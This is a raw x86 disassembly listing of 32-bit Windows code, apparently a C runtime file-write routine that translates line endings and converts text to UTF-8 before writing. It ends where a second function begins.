  404f90:	ff e6                	jmp    *%esi
  404f92:	55                   	push   %ebp
  404f93:	8b ec                	mov    %esp,%ebp
  404f95:	53                   	push   %ebx
  404f96:	56                   	push   %esi
  404f97:	57                   	push   %edi
  404f98:	6a 00                	push   $0x0
  404f9a:	52                   	push   %edx
  404f9b:	68 a6 4f 40 00       	push   $0x404fa6
  404fa0:	51                   	push   %ecx
  404fa1:	e8 7c 42 00 00       	call   0x409222
  404fa6:	5f                   	pop    %edi
  404fa7:	5e                   	pop    %esi
  404fa8:	5b                   	pop    %ebx
  404fa9:	5d                   	pop    %ebp
  404faa:	c3                   	ret
  404fab:	55                   	push   %ebp
  404fac:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  404fb0:	52                   	push   %edx
  404fb1:	51                   	push   %ecx
  404fb2:	ff 74 24 14          	push   0x14(%esp)
  404fb6:	e8 b5 fe ff ff       	call   0x404e70
  404fbb:	83 c4 0c             	add    $0xc,%esp
  404fbe:	5d                   	pop    %ebp
  404fbf:	c2 08 00             	ret    $0x8
  404fc2:	8b ff                	mov    %edi,%edi
  404fc4:	55                   	push   %ebp
  404fc5:	8b ec                	mov    %esp,%ebp
  404fc7:	b8 e4 1a 00 00       	mov    $0x1ae4,%eax
  404fcc:	e8 6f 26 00 00       	call   0x407640
  404fd1:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  404fd6:	33 c5                	xor    %ebp,%eax
  404fd8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404fdb:	8b 45 0c             	mov    0xc(%ebp),%eax
  404fde:	56                   	push   %esi
  404fdf:	8b 75 08             	mov    0x8(%ebp),%esi
  404fe2:	57                   	push   %edi
  404fe3:	33 ff                	xor    %edi,%edi
  404fe5:	89 85 34 e5 ff ff    	mov    %eax,-0x1acc(%ebp)
  404feb:	89 bd 38 e5 ff ff    	mov    %edi,-0x1ac8(%ebp)
  404ff1:	89 bd 30 e5 ff ff    	mov    %edi,-0x1ad0(%ebp)
  404ff7:	39 7d 10             	cmp    %edi,0x10(%ebp)
  404ffa:	75 07                	jne    0x405003
  404ffc:	33 c0                	xor    %eax,%eax
  404ffe:	e9 ae 06 00 00       	jmp    0x4056b1
  405003:	3b c7                	cmp    %edi,%eax
  405005:	75 1f                	jne    0x405026
  405007:	e8 b4 f2 ff ff       	call   0x4042c0
  40500c:	89 38                	mov    %edi,(%eax)
  40500e:	e8 9a f2 ff ff       	call   0x4042ad
  405013:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  405019:	e8 3d f2 ff ff       	call   0x40425b
  40501e:	83 c8 ff             	or     $0xffffffff,%eax
  405021:	e9 8b 06 00 00       	jmp    0x4056b1
  405026:	8b c6                	mov    %esi,%eax
  405028:	c1 f8 05             	sar    $0x5,%eax
  40502b:	8b fe                	mov    %esi,%edi
  40502d:	53                   	push   %ebx
  40502e:	8d 1c 85 20 16 41 00 	lea    0x411620(,%eax,4),%ebx
  405035:	8b 03                	mov    (%ebx),%eax
  405037:	83 e7 1f             	and    $0x1f,%edi
  40503a:	c1 e7 06             	shl    $0x6,%edi
  40503d:	8a 4c 38 24          	mov    0x24(%eax,%edi,1),%cl
  405041:	02 c9                	add    %cl,%cl
  405043:	d0 f9                	sar    $1,%cl
  405045:	89 9d 24 e5 ff ff    	mov    %ebx,-0x1adc(%ebp)
  40504b:	88 8d 3f e5 ff ff    	mov    %cl,-0x1ac1(%ebp)
  405051:	80 f9 02             	cmp    $0x2,%cl
  405054:	74 05                	je     0x40505b
  405056:	80 f9 01             	cmp    $0x1,%cl
  405059:	75 27                	jne    0x405082
  40505b:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40505e:	f7 d1                	not    %ecx
  405060:	f6 c1 01             	test   $0x1,%cl
  405063:	75 1d                	jne    0x405082
  405065:	e8 56 f2 ff ff       	call   0x4042c0
  40506a:	83 20 00             	andl   $0x0,(%eax)
  40506d:	e8 3b f2 ff ff       	call   0x4042ad
  405072:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  405078:	e8 de f1 ff ff       	call   0x40425b
  40507d:	e9 1d 06 00 00       	jmp    0x40569f
  405082:	f6 44 38 04 20       	testb  $0x20,0x4(%eax,%edi,1)
  405087:	74 0f                	je     0x405098
  405089:	6a 02                	push   $0x2
  40508b:	6a 00                	push   $0x0
  40508d:	6a 00                	push   $0x0
  40508f:	56                   	push   %esi
  405090:	e8 12 23 00 00       	call   0x4073a7
  405095:	83 c4 10             	add    $0x10,%esp
  405098:	56                   	push   %esi
  405099:	e8 8e 23 00 00       	call   0x40742c
  40509e:	59                   	pop    %ecx
  40509f:	85 c0                	test   %eax,%eax
  4050a1:	0f 84 99 02 00 00    	je     0x405340
  4050a7:	8b 03                	mov    (%ebx),%eax
  4050a9:	f6 44 07 04 80       	testb  $0x80,0x4(%edi,%eax,1)
  4050ae:	0f 84 8c 02 00 00    	je     0x405340
  4050b4:	e8 cc 15 00 00       	call   0x406685
  4050b9:	8b 40 6c             	mov    0x6c(%eax),%eax
  4050bc:	33 c9                	xor    %ecx,%ecx
  4050be:	39 48 14             	cmp    %ecx,0x14(%eax)
  4050c1:	8d 85 20 e5 ff ff    	lea    -0x1ae0(%ebp),%eax
  4050c7:	0f 94 c1             	sete   %cl
  4050ca:	50                   	push   %eax
  4050cb:	8b 03                	mov    (%ebx),%eax
  4050cd:	ff 34 07             	push   (%edi,%eax,1)
  4050d0:	8b f1                	mov    %ecx,%esi
  4050d2:	ff 15 14 b1 40 00    	call   *0x40b114
  4050d8:	33 c9                	xor    %ecx,%ecx
  4050da:	3b c1                	cmp    %ecx,%eax
  4050dc:	0f 84 60 02 00 00    	je     0x405342
  4050e2:	3b f1                	cmp    %ecx,%esi
  4050e4:	74 0c                	je     0x4050f2
  4050e6:	38 8d 3f e5 ff ff    	cmp    %cl,-0x1ac1(%ebp)
  4050ec:	0f 84 50 02 00 00    	je     0x405342
  4050f2:	ff 15 10 b1 40 00    	call   *0x40b110
  4050f8:	8b 9d 34 e5 ff ff    	mov    -0x1acc(%ebp),%ebx
  4050fe:	89 85 20 e5 ff ff    	mov    %eax,-0x1ae0(%ebp)
  405104:	33 c0                	xor    %eax,%eax
  405106:	89 85 2c e5 ff ff    	mov    %eax,-0x1ad4(%ebp)
  40510c:	39 45 10             	cmp    %eax,0x10(%ebp)
  40510f:	0f 86 23 05 00 00    	jbe    0x405638
  405115:	89 85 40 e5 ff ff    	mov    %eax,-0x1ac0(%ebp)
  40511b:	8a 85 3f e5 ff ff    	mov    -0x1ac1(%ebp),%al
  405121:	84 c0                	test   %al,%al
  405123:	0f 85 67 01 00 00    	jne    0x405290
  405129:	8a 0b                	mov    (%ebx),%cl
  40512b:	8b b5 24 e5 ff ff    	mov    -0x1adc(%ebp),%esi
  405131:	33 c0                	xor    %eax,%eax
  405133:	80 f9 0a             	cmp    $0xa,%cl
  405136:	0f 94 c0             	sete   %al
  405139:	89 85 1c e5 ff ff    	mov    %eax,-0x1ae4(%ebp)
  40513f:	8b 06                	mov    (%esi),%eax
  405141:	03 c7                	add    %edi,%eax
  405143:	83 78 38 00          	cmpl   $0x0,0x38(%eax)
  405147:	74 15                	je     0x40515e
  405149:	8a 50 34             	mov    0x34(%eax),%dl
  40514c:	88 55 f4             	mov    %dl,-0xc(%ebp)
  40514f:	88 4d f5             	mov    %cl,-0xb(%ebp)
  405152:	83 60 38 00          	andl   $0x0,0x38(%eax)
  405156:	6a 02                	push   $0x2
  405158:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40515b:	50                   	push   %eax
  40515c:	eb 4b                	jmp    0x4051a9
  40515e:	0f be c1             	movsbl %cl,%eax
  405161:	50                   	push   %eax
  405162:	e8 c5 24 00 00       	call   0x40762c
  405167:	59                   	pop    %ecx
  405168:	85 c0                	test   %eax,%eax
  40516a:	74 3a                	je     0x4051a6
  40516c:	8b 8d 34 e5 ff ff    	mov    -0x1acc(%ebp),%ecx
  405172:	2b cb                	sub    %ebx,%ecx
  405174:	03 4d 10             	add    0x10(%ebp),%ecx
  405177:	33 c0                	xor    %eax,%eax
  405179:	40                   	inc    %eax
  40517a:	3b c8                	cmp    %eax,%ecx
  40517c:	0f 86 a5 01 00 00    	jbe    0x405327
  405182:	6a 02                	push   $0x2
  405184:	8d 85 44 e5 ff ff    	lea    -0x1abc(%ebp),%eax
  40518a:	53                   	push   %ebx
  40518b:	50                   	push   %eax
  40518c:	e8 49 24 00 00       	call   0x4075da
  405191:	83 c4 0c             	add    $0xc,%esp
  405194:	83 f8 ff             	cmp    $0xffffffff,%eax
  405197:	0f 84 92 04 00 00    	je     0x40562f
  40519d:	43                   	inc    %ebx
  40519e:	ff 85 40 e5 ff ff    	incl   -0x1ac0(%ebp)
  4051a4:	eb 1b                	jmp    0x4051c1
  4051a6:	6a 01                	push   $0x1
  4051a8:	53                   	push   %ebx
  4051a9:	8d 85 44 e5 ff ff    	lea    -0x1abc(%ebp),%eax
  4051af:	50                   	push   %eax
  4051b0:	e8 25 24 00 00       	call   0x4075da
  4051b5:	83 c4 0c             	add    $0xc,%esp
  4051b8:	83 f8 ff             	cmp    $0xffffffff,%eax
  4051bb:	0f 84 6e 04 00 00    	je     0x40562f
  4051c1:	33 c0                	xor    %eax,%eax
  4051c3:	50                   	push   %eax
  4051c4:	50                   	push   %eax
  4051c5:	6a 05                	push   $0x5
  4051c7:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4051ca:	51                   	push   %ecx
  4051cb:	6a 01                	push   $0x1
  4051cd:	8d 8d 44 e5 ff ff    	lea    -0x1abc(%ebp),%ecx
  4051d3:	51                   	push   %ecx
  4051d4:	50                   	push   %eax
  4051d5:	ff b5 20 e5 ff ff    	push   -0x1ae0(%ebp)
  4051db:	43                   	inc    %ebx
  4051dc:	ff 85 40 e5 ff ff    	incl   -0x1ac0(%ebp)
  4051e2:	ff 15 b0 b0 40 00    	call   *0x40b0b0
  4051e8:	8b f0                	mov    %eax,%esi
  4051ea:	85 f6                	test   %esi,%esi
  4051ec:	0f 84 3d 04 00 00    	je     0x40562f
  4051f2:	6a 00                	push   $0x0
  4051f4:	8d 85 2c e5 ff ff    	lea    -0x1ad4(%ebp),%eax
  4051fa:	50                   	push   %eax
  4051fb:	56                   	push   %esi
  4051fc:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4051ff:	50                   	push   %eax
  405200:	8b 85 24 e5 ff ff    	mov    -0x1adc(%ebp),%eax
  405206:	8b 00                	mov    (%eax),%eax
  405208:	ff 34 07             	push   (%edi,%eax,1)
  40520b:	ff 15 0c b1 40 00    	call   *0x40b10c
  405211:	85 c0                	test   %eax,%eax
  405213:	0f 84 0a 04 00 00    	je     0x405623
  405219:	8b 85 40 e5 ff ff    	mov    -0x1ac0(%ebp),%eax
  40521f:	8b 8d 30 e5 ff ff    	mov    -0x1ad0(%ebp),%ecx
  405225:	03 c1                	add    %ecx,%eax
  405227:	89 85 38 e5 ff ff    	mov    %eax,-0x1ac8(%ebp)
  40522d:	39 b5 2c e5 ff ff    	cmp    %esi,-0x1ad4(%ebp)
  405233:	0f 8c f6 03 00 00    	jl     0x40562f
  405239:	83 bd 1c e5 ff ff 00 	cmpl   $0x0,-0x1ae4(%ebp)
  405240:	0f 84 cd 00 00 00    	je     0x405313
  405246:	6a 00                	push   $0x0
  405248:	8d 85 2c e5 ff ff    	lea    -0x1ad4(%ebp),%eax
  40524e:	50                   	push   %eax
  40524f:	6a 01                	push   $0x1
  405251:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405254:	50                   	push   %eax
  405255:	8b 85 24 e5 ff ff    	mov    -0x1adc(%ebp),%eax
  40525b:	8b 00                	mov    (%eax),%eax
  40525d:	c6 45 f4 0d          	movb   $0xd,-0xc(%ebp)
  405261:	ff 34 07             	push   (%edi,%eax,1)
  405264:	ff 15 0c b1 40 00    	call   *0x40b10c
  40526a:	85 c0                	test   %eax,%eax
  40526c:	0f 84 b1 03 00 00    	je     0x405623
  405272:	83 bd 2c e5 ff ff 01 	cmpl   $0x1,-0x1ad4(%ebp)
  405279:	0f 8c b0 03 00 00    	jl     0x40562f
  40527f:	ff 85 30 e5 ff ff    	incl   -0x1ad0(%ebp)
  405285:	ff 85 38 e5 ff ff    	incl   -0x1ac8(%ebp)
  40528b:	e9 83 00 00 00       	jmp    0x405313
  405290:	3c 01                	cmp    $0x1,%al
  405292:	74 04                	je     0x405298
  405294:	3c 02                	cmp    $0x2,%al
  405296:	75 21                	jne    0x4052b9
  405298:	0f b7 33             	movzwl (%ebx),%esi
  40529b:	33 c9                	xor    %ecx,%ecx
  40529d:	83 fe 0a             	cmp    $0xa,%esi
  4052a0:	0f 94 c1             	sete   %cl
  4052a3:	83 c3 02             	add    $0x2,%ebx
  4052a6:	83 85 40 e5 ff ff 02 	addl   $0x2,-0x1ac0(%ebp)
  4052ad:	89 b5 44 e5 ff ff    	mov    %esi,-0x1abc(%ebp)
  4052b3:	89 8d 1c e5 ff ff    	mov    %ecx,-0x1ae4(%ebp)
  4052b9:	3c 01                	cmp    $0x1,%al
  4052bb:	74 04                	je     0x4052c1
  4052bd:	3c 02                	cmp    $0x2,%al
  4052bf:	75 52                	jne    0x405313
  4052c1:	ff b5 44 e5 ff ff    	push   -0x1abc(%ebp)
  4052c7:	e8 b6 21 00 00       	call   0x407482
  4052cc:	59                   	pop    %ecx
  4052cd:	66 3b 85 44 e5 ff ff 	cmp    -0x1abc(%ebp),%ax
  4052d4:	0f 85 49 03 00 00    	jne    0x405623
  4052da:	83 85 38 e5 ff ff 02 	addl   $0x2,-0x1ac8(%ebp)
  4052e1:	83 bd 1c e5 ff ff 00 	cmpl   $0x0,-0x1ae4(%ebp)
  4052e8:	74 29                	je     0x405313
  4052ea:	6a 0d                	push   $0xd
  4052ec:	58                   	pop    %eax
  4052ed:	50                   	push   %eax
  4052ee:	89 85 44 e5 ff ff    	mov    %eax,-0x1abc(%ebp)
  4052f4:	e8 89 21 00 00       	call   0x407482
  4052f9:	59                   	pop    %ecx
  4052fa:	66 3b 85 44 e5 ff ff 	cmp    -0x1abc(%ebp),%ax
  405301:	0f 85 1c 03 00 00    	jne    0x405623
  405307:	ff 85 38 e5 ff ff    	incl   -0x1ac8(%ebp)
  40530d:	ff 85 30 e5 ff ff    	incl   -0x1ad0(%ebp)
  405313:	8b 45 10             	mov    0x10(%ebp),%eax
  405316:	39 85 40 e5 ff ff    	cmp    %eax,-0x1ac0(%ebp)
  40531c:	0f 82 f9 fd ff ff    	jb     0x40511b
  405322:	e9 08 03 00 00       	jmp    0x40562f
  405327:	8b 0e                	mov    (%esi),%ecx
  405329:	8a 13                	mov    (%ebx),%dl
  40532b:	ff 85 38 e5 ff ff    	incl   -0x1ac8(%ebp)
  405331:	88 54 0f 34          	mov    %dl,0x34(%edi,%ecx,1)
  405335:	8b 0e                	mov    (%esi),%ecx
  405337:	89 44 0f 38          	mov    %eax,0x38(%edi,%ecx,1)
  40533b:	e9 ef 02 00 00       	jmp    0x40562f
  405340:	33 c9                	xor    %ecx,%ecx
  405342:	8b 03                	mov    (%ebx),%eax
  405344:	f6 44 38 04 80       	testb  $0x80,0x4(%eax,%edi,1)
  405349:	0f 84 a1 02 00 00    	je     0x4055f0
  40534f:	80 bd 3f e5 ff ff 00 	cmpb   $0x0,-0x1ac1(%ebp)
  405356:	89 8d 44 e5 ff ff    	mov    %ecx,-0x1abc(%ebp)
  40535c:	0f 85 a8 00 00 00    	jne    0x40540a
  405362:	8b 9d 34 e5 ff ff    	mov    -0x1acc(%ebp),%ebx
  405368:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  40536b:	0f 86 fd 02 00 00    	jbe    0x40566e
  405371:	8b cb                	mov    %ebx,%ecx
  405373:	33 f6                	xor    %esi,%esi
  405375:	2b 8d 34 e5 ff ff    	sub    -0x1acc(%ebp),%ecx
  40537b:	8d 85 48 e5 ff ff    	lea    -0x1ab8(%ebp),%eax
  405381:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  405384:	73 26                	jae    0x4053ac
  405386:	8a 13                	mov    (%ebx),%dl
  405388:	43                   	inc    %ebx
  405389:	41                   	inc    %ecx
  40538a:	89 9d 20 e5 ff ff    	mov    %ebx,-0x1ae0(%ebp)
  405390:	80 fa 0a             	cmp    $0xa,%dl
  405393:	75 0b                	jne    0x4053a0
  405395:	ff 85 30 e5 ff ff    	incl   -0x1ad0(%ebp)
  40539b:	c6 00 0d             	movb   $0xd,(%eax)
  40539e:	40                   	inc    %eax
  40539f:	46                   	inc    %esi
  4053a0:	88 10                	mov    %dl,(%eax)
  4053a2:	40                   	inc    %eax
  4053a3:	46                   	inc    %esi
  4053a4:	81 fe ff 13 00 00    	cmp    $0x13ff,%esi
  4053aa:	72 d5                	jb     0x405381
  4053ac:	8b f0                	mov    %eax,%esi
  4053ae:	8d 85 48 e5 ff ff    	lea    -0x1ab8(%ebp),%eax
  4053b4:	2b f0                	sub    %eax,%esi
  4053b6:	6a 00                	push   $0x0
  4053b8:	8d 85 28 e5 ff ff    	lea    -0x1ad8(%ebp),%eax
  4053be:	50                   	push   %eax
  4053bf:	56                   	push   %esi
  4053c0:	8d 85 48 e5 ff ff    	lea    -0x1ab8(%ebp),%eax
  4053c6:	50                   	push   %eax
  4053c7:	8b 85 24 e5 ff ff    	mov    -0x1adc(%ebp),%eax
  4053cd:	8b 00                	mov    (%eax),%eax
  4053cf:	ff 34 07             	push   (%edi,%eax,1)
  4053d2:	ff 15 0c b1 40 00    	call   *0x40b10c
  4053d8:	85 c0                	test   %eax,%eax
  4053da:	0f 84 43 02 00 00    	je     0x405623
  4053e0:	8b 85 28 e5 ff ff    	mov    -0x1ad8(%ebp),%eax
  4053e6:	01 85 38 e5 ff ff    	add    %eax,-0x1ac8(%ebp)
  4053ec:	3b c6                	cmp    %esi,%eax
  4053ee:	0f 8c 3b 02 00 00    	jl     0x40562f
  4053f4:	8b c3                	mov    %ebx,%eax
  4053f6:	2b 85 34 e5 ff ff    	sub    -0x1acc(%ebp),%eax
  4053fc:	3b 45 10             	cmp    0x10(%ebp),%eax
  4053ff:	0f 82 6c ff ff ff    	jb     0x405371
  405405:	e9 25 02 00 00       	jmp    0x40562f
  40540a:	80 bd 3f e5 ff ff 02 	cmpb   $0x2,-0x1ac1(%ebp)
  405411:	0f 85 cd 00 00 00    	jne    0x4054e4
  405417:	8b 9d 34 e5 ff ff    	mov    -0x1acc(%ebp),%ebx
  40541d:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  405420:	0f 86 48 02 00 00    	jbe    0x40566e
  405426:	83 a5 40 e5 ff ff 00 	andl   $0x0,-0x1ac0(%ebp)
  40542d:	8b cb                	mov    %ebx,%ecx
  40542f:	2b 8d 34 e5 ff ff    	sub    -0x1acc(%ebp),%ecx
  405435:	6a 02                	push   $0x2
  405437:	8d 85 48 e5 ff ff    	lea    -0x1ab8(%ebp),%eax
  40543d:	5e                   	pop    %esi
  40543e:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  405441:	73 43                	jae    0x405486
  405443:	0f b7 13             	movzwl (%ebx),%edx
  405446:	03 de                	add    %esi,%ebx
  405448:	03 ce                	add    %esi,%ecx
  40544a:	89 9d 20 e5 ff ff    	mov    %ebx,-0x1ae0(%ebp)
  405450:	83 fa 0a             	cmp    $0xa,%edx
  405453:	75 1a                	jne    0x40546f
  405455:	01 b5 30 e5 ff ff    	add    %esi,-0x1ad0(%ebp)
  40545b:	6a 0d                	push   $0xd
  40545d:	5b                   	pop    %ebx
  40545e:	66 89 18             	mov    %bx,(%eax)
  405461:	8b 9d 20 e5 ff ff    	mov    -0x1ae0(%ebp),%ebx
  405467:	03 c6                	add    %esi,%eax
  405469:	01 b5 40 e5 ff ff    	add    %esi,-0x1ac0(%ebp)
  40546f:	01 b5 40 e5 ff ff    	add    %esi,-0x1ac0(%ebp)
  405475:	66 89 10             	mov    %dx,(%eax)
  405478:	03 c6                	add    %esi,%eax
  40547a:	81 bd 40 e5 ff ff fe 	cmpl   $0x13fe,-0x1ac0(%ebp)
  405481:	13 00 00 
  405484:	72 b8                	jb     0x40543e
  405486:	8b f0                	mov    %eax,%esi
  405488:	8d 85 48 e5 ff ff    	lea    -0x1ab8(%ebp),%eax
  40548e:	2b f0                	sub    %eax,%esi
  405490:	6a 00                	push   $0x0
  405492:	8d 85 28 e5 ff ff    	lea    -0x1ad8(%ebp),%eax
  405498:	50                   	push   %eax
  405499:	56                   	push   %esi
  40549a:	8d 85 48 e5 ff ff    	lea    -0x1ab8(%ebp),%eax
  4054a0:	50                   	push   %eax
  4054a1:	8b 85 24 e5 ff ff    	mov    -0x1adc(%ebp),%eax
  4054a7:	8b 00                	mov    (%eax),%eax
  4054a9:	ff 34 07             	push   (%edi,%eax,1)
  4054ac:	ff 15 0c b1 40 00    	call   *0x40b10c
  4054b2:	85 c0                	test   %eax,%eax
  4054b4:	0f 84 69 01 00 00    	je     0x405623
  4054ba:	8b 85 28 e5 ff ff    	mov    -0x1ad8(%ebp),%eax
  4054c0:	01 85 38 e5 ff ff    	add    %eax,-0x1ac8(%ebp)
  4054c6:	3b c6                	cmp    %esi,%eax
  4054c8:	0f 8c 61 01 00 00    	jl     0x40562f
  4054ce:	8b c3                	mov    %ebx,%eax
  4054d0:	2b 85 34 e5 ff ff    	sub    -0x1acc(%ebp),%eax
  4054d6:	3b 45 10             	cmp    0x10(%ebp),%eax
  4054d9:	0f 82 47 ff ff ff    	jb     0x405426
  4054df:	e9 4b 01 00 00       	jmp    0x40562f
  4054e4:	8b 85 34 e5 ff ff    	mov    -0x1acc(%ebp),%eax
  4054ea:	89 85 2c e5 ff ff    	mov    %eax,-0x1ad4(%ebp)
  4054f0:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  4054f3:	0f 86 75 01 00 00    	jbe    0x40566e
  4054f9:	8b 8d 2c e5 ff ff    	mov    -0x1ad4(%ebp),%ecx
  4054ff:	83 a5 40 e5 ff ff 00 	andl   $0x0,-0x1ac0(%ebp)
  405506:	2b 8d 34 e5 ff ff    	sub    -0x1acc(%ebp),%ecx
  40550c:	6a 02                	push   $0x2
  40550e:	8d 85 48 f9 ff ff    	lea    -0x6b8(%ebp),%eax
  405514:	5e                   	pop    %esi
  405515:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  405518:	73 3b                	jae    0x405555
  40551a:	8b 95 2c e5 ff ff    	mov    -0x1ad4(%ebp),%edx
  405520:	0f b7 12             	movzwl (%edx),%edx
  405523:	01 b5 2c e5 ff ff    	add    %esi,-0x1ad4(%ebp)
  405529:	03 ce                	add    %esi,%ecx
  40552b:	83 fa 0a             	cmp    $0xa,%edx
  40552e:	75 0e                	jne    0x40553e
  405530:	6a 0d                	push   $0xd
  405532:	5b                   	pop    %ebx
  405533:	66 89 18             	mov    %bx,(%eax)
  405536:	03 c6                	add    %esi,%eax
  405538:	01 b5 40 e5 ff ff    	add    %esi,-0x1ac0(%ebp)
  40553e:	01 b5 40 e5 ff ff    	add    %esi,-0x1ac0(%ebp)
  405544:	66 89 10             	mov    %dx,(%eax)
  405547:	03 c6                	add    %esi,%eax
  405549:	81 bd 40 e5 ff ff a8 	cmpl   $0x6a8,-0x1ac0(%ebp)
  405550:	06 00 00 
  405553:	72 c0                	jb     0x405515
  405555:	33 f6                	xor    %esi,%esi
  405557:	56                   	push   %esi
  405558:	56                   	push   %esi
  405559:	68 55 0d 00 00       	push   $0xd55
  40555e:	8d 8d f0 eb ff ff    	lea    -0x1410(%ebp),%ecx
  405564:	51                   	push   %ecx
  405565:	8d 8d 48 f9 ff ff    	lea    -0x6b8(%ebp),%ecx
  40556b:	2b c1                	sub    %ecx,%eax
  40556d:	99                   	cltd
  40556e:	2b c2                	sub    %edx,%eax
  405570:	d1 f8                	sar    $1,%eax
  405572:	50                   	push   %eax
  405573:	8b c1                	mov    %ecx,%eax
  405575:	50                   	push   %eax
  405576:	56                   	push   %esi
  405577:	68 e9 fd 00 00       	push   $0xfde9
  40557c:	ff 15 b0 b0 40 00    	call   *0x40b0b0
  405582:	8b d8                	mov    %eax,%ebx
  405584:	3b de                	cmp    %esi,%ebx
  405586:	0f 84 97 00 00 00    	je     0x405623
  40558c:	6a 00                	push   $0x0
  40558e:	8d 85 28 e5 ff ff    	lea    -0x1ad8(%ebp),%eax
  405594:	50                   	push   %eax
  405595:	8b c3                	mov    %ebx,%eax
  405597:	2b c6                	sub    %esi,%eax
  405599:	50                   	push   %eax
  40559a:	8d 84 35 f0 eb ff ff 	lea    -0x1410(%ebp,%esi,1),%eax
  4055a1:	50                   	push   %eax
  4055a2:	8b 85 24 e5 ff ff    	mov    -0x1adc(%ebp),%eax
  4055a8:	8b 00                	mov    (%eax),%eax
  4055aa:	ff 34 07             	push   (%edi,%eax,1)
  4055ad:	ff 15 0c b1 40 00    	call   *0x40b10c
  4055b3:	85 c0                	test   %eax,%eax
  4055b5:	74 0c                	je     0x4055c3
  4055b7:	03 b5 28 e5 ff ff    	add    -0x1ad8(%ebp),%esi
  4055bd:	3b de                	cmp    %esi,%ebx
  4055bf:	7f cb                	jg     0x40558c
  4055c1:	eb 0c                	jmp    0x4055cf
  4055c3:	ff 15 8c b0 40 00    	call   *0x40b08c
  4055c9:	89 85 44 e5 ff ff    	mov    %eax,-0x1abc(%ebp)
  4055cf:	3b de                	cmp    %esi,%ebx
  4055d1:	7f 5c                	jg     0x40562f
  4055d3:	8b 85 2c e5 ff ff    	mov    -0x1ad4(%ebp),%eax
  4055d9:	2b 85 34 e5 ff ff    	sub    -0x1acc(%ebp),%eax
  4055df:	89 85 38 e5 ff ff    	mov    %eax,-0x1ac8(%ebp)
  4055e5:	3b 45 10             	cmp    0x10(%ebp),%eax
  4055e8:	0f 82 0b ff ff ff    	jb     0x4054f9
  4055ee:	eb 3f                	jmp    0x40562f
  4055f0:	51                   	push   %ecx
  4055f1:	8d 8d 28 e5 ff ff    	lea    -0x1ad8(%ebp),%ecx
  4055f7:	51                   	push   %ecx
  4055f8:	ff 75 10             	push   0x10(%ebp)
  4055fb:	ff b5 34 e5 ff ff    	push   -0x1acc(%ebp)
  405601:	ff 34 38             	push   (%eax,%edi,1)
  405604:	ff 15 0c b1 40 00    	call   *0x40b10c
  40560a:	85 c0                	test   %eax,%eax
  40560c:	74 15                	je     0x405623
  40560e:	8b 85 28 e5 ff ff    	mov    -0x1ad8(%ebp),%eax
  405614:	83 a5 44 e5 ff ff 00 	andl   $0x0,-0x1abc(%ebp)
  40561b:	89 85 38 e5 ff ff    	mov    %eax,-0x1ac8(%ebp)
  405621:	eb 0c                	jmp    0x40562f
  405623:	ff 15 8c b0 40 00    	call   *0x40b08c
  405629:	89 85 44 e5 ff ff    	mov    %eax,-0x1abc(%ebp)
  40562f:	83 bd 38 e5 ff ff 00 	cmpl   $0x0,-0x1ac8(%ebp)
  405636:	75 6c                	jne    0x4056a4
  405638:	83 bd 44 e5 ff ff 00 	cmpl   $0x0,-0x1abc(%ebp)
  40563f:	74 2d                	je     0x40566e
  405641:	6a 05                	push   $0x5
  405643:	5e                   	pop    %esi
  405644:	39 b5 44 e5 ff ff    	cmp    %esi,-0x1abc(%ebp)
  40564a:	75 14                	jne    0x405660
  40564c:	e8 5c ec ff ff       	call   0x4042ad
  405651:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  405657:	e8 64 ec ff ff       	call   0x4042c0
  40565c:	89 30                	mov    %esi,(%eax)
  40565e:	eb 3f                	jmp    0x40569f
  405660:	ff b5 44 e5 ff ff    	push   -0x1abc(%ebp)
  405666:	e8 68 ec ff ff       	call   0x4042d3
  40566b:	59                   	pop    %ecx
  40566c:	eb 31                	jmp    0x40569f
  40566e:	8b 85 24 e5 ff ff    	mov    -0x1adc(%ebp),%eax
  405674:	8b 00                	mov    (%eax),%eax
  405676:	f6 44 07 04 40       	testb  $0x40,0x4(%edi,%eax,1)
  40567b:	74 0f                	je     0x40568c
  40567d:	8b 85 34 e5 ff ff    	mov    -0x1acc(%ebp),%eax
  405683:	80 38 1a             	cmpb   $0x1a,(%eax)
  405686:	75 04                	jne    0x40568c
  405688:	33 c0                	xor    %eax,%eax
  40568a:	eb 24                	jmp    0x4056b0
  40568c:	e8 1c ec ff ff       	call   0x4042ad
  405691:	c7 00 1c 00 00 00    	movl   $0x1c,(%eax)
  405697:	e8 24 ec ff ff       	call   0x4042c0
  40569c:	83 20 00             	andl   $0x0,(%eax)
  40569f:	83 c8 ff             	or     $0xffffffff,%eax
  4056a2:	eb 0c                	jmp    0x4056b0
  4056a4:	8b 85 38 e5 ff ff    	mov    -0x1ac8(%ebp),%eax
  4056aa:	2b 85 30 e5 ff ff    	sub    -0x1ad0(%ebp),%eax
  4056b0:	5b                   	pop    %ebx
  4056b1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4056b4:	5f                   	pop    %edi
  4056b5:	33 cd                	xor    %ebp,%ecx
  4056b7:	5e                   	pop    %esi
  4056b8:	e8 c1 d9 ff ff       	call   0x40307e
  4056bd:	c9                   	leave
  4056be:	c3                   	ret
  4056bf:	6a 10                	push   $0x10
  4056c1:	68 68 d8 40 00       	push   $0x40d868
  4056c6:	e8 05 f4 ff ff       	call   0x404ad0
  4056cb:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4056ce:	83 fb fe             	cmp    $0xfffffffe,%ebx
  4056d1:	75 1b                	jne    0x4056ee
  4056d3:	e8 e8 eb ff ff       	call   0x4042c0
  4056d8:	83 20 00             	andl   $0x0,(%eax)
  4056db:	e8 cd eb ff ff       	call   0x4042ad
  4056e0:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4056e6:	83 c8 ff             	or     $0xffffffff,%eax
  4056e9:	e9 94 00 00 00       	jmp    0x405782
